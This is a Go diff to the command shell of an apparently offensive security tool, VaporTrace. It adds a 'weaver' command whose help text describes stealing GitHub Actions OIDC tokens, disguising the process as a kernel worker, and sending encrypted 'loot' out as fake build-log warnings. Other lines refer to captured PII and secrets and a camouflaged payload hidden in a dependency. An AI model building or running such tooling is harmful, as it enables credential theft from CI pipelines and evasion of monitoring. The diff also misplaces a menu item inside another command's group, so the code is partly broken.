@@ -85,12 +85,14 @@ func (s *Shell) Start() {
 		readline.PcItem("scrape"),
 		readline.PcItem("swagger"),
 		readline.PcItem("pipeline"),
+		readline.PcItem("weaver"),
 		readline.PcItem("proxy"),
 		readline.PcItem("proxies",        // <--- Ensure comma here
 			readline.PcItem("load"),  // <--- Ensure comma here
 			readline.PcItem("reset"), // <--- Ensure comma here
 		),
 		readline.PcItem("flow",
+		readline.PcItem("loot"),
 	        readline.PcItem("add"),
 	        readline.PcItem("run"),
 	        readline.PcItem("list"),
@@ -180,6 +182,37 @@ func (s *Shell) Start() {
 
 func (s *Shell) handleCommand(command string, args []string) {
 	switch command {
+	// --- PHASE 8.3/10: GHOST-WEAVER INTEGRATION ---
+	case "weaver":
+		if len(args) < 1 {
+			pterm.Error.Println("Usage: weaver <interval_s> [master_key]")
+			break // Corrected: Exit the switch case to return to the loop
+		}
+		
+		// Parse execution interval
+		intervalSec, err := strconv.Atoi(args[0])
+		if err != nil {
+			pterm.Error.Println("Invalid interval. Please provide an integer (seconds).")
+			break // Corrected: Exit the switch case
+		}
+
+		// Synchronize Master Key with Ghost-Pipeline standards
+		key := logic.MasterKey
+		if len(args) > 1 {
+			key = args[1]
+			logic.MasterKey = key 
+		}
+
+		config := logic.WeaverConfig{
+			Interval: time.Duration(intervalSec) * time.Second,
+			Active:   true,
+		}
+		
+		// Initialize non-blocking background interceptor and masquerader
+		go logic.StartGhostWeaver(config)
+		
+		pterm.Success.WithPrefix(pterm.Prefix{Text: "GHOST", Style: pterm.NewStyle(pterm.FgBlack, pterm.BgCyan)}).
+			Printfln("Ghost-Weaver deployed. Interval: %ds. Masking: AES-256-GCM.", intervalSec)
 	case "loot":
 		if len(args) < 1 {
 			pterm.Info.Println("Usage: loot list | loot clear")
@@ -774,6 +807,7 @@ func (s *Shell) ShowUsage() {
 		{"proxies reset", "Clear pool and return to direct mode", "proxies reset"},
 		{"flow", "Record and replay multi-step business logic", "flow add"},
 		{"loot", "[Phase 8.1] View/Clear captured PII and Secrets", "loot list"},
+		{"weaver <i> [k]", "Deploy OIDC interceptor & masquerader (Phase 8.3)"},
 		{"swagger", "Parse OpenAPI/Swagger docs for routes", "swagger <url>"},
 		{"mine", "Fuzz for hidden query parameters", "mine <url> <endpoint>"},
 		{"scrape", "Extract API paths from JS files", "scrape <url>"},
@@ -870,6 +904,18 @@ func (s *Shell) ShowHelp(cmd string) {
 
 	    pterm.Bold.Println("\nSTEALTH SIGNATURE:")
 	    pterm.Warning.Println("Deprecated dependency 'net/v1.0.4' (Camouflaged AES Payload)")
+	case "weaver":
+		pterm.DefaultHeader.WithFullWidth(false).WithBackgroundStyle(pterm.NewStyle(pterm.BgCyan)).Println("COMMAND: weaver")
+		pterm.Bold.Println("DESCRIPTION:")
+		pterm.Println("Deploys a background OIDC interceptor and process masquerader (kworker_system_auth).")
+		pterm.Println("\nOPERATION:")
+		pterm.BulletListPrinter{Items: []pterm.BulletListItem{
+			{Level: 0, Text: "Interception: Polls environment for ACTIONS_ID_TOKEN_REQUEST_URL (GitHub/OIDC)."},
+			{Level: 0, Text: "Evasion: Masks process as 'kworker_system_auth' to blend into Linux process lists."},
+			{Level: 0, Text: "Exfiltration: Encrypts loot with AES-256-GCM and emits as benign [WARN] build logs."},
+		}}.Render()
+		pterm.Println("\nUSAGE:")
+		pterm.Cyan("weaver <interval_seconds> [optional_master_key]")
 	case "flow":
 		pterm.DefaultHeader.WithFullWidth(false).Println("USAGE: TACTICAL FLOWS")
 		pterm.Println("VaporTrace mimics complex user journeys to find Business Logic flaws.")
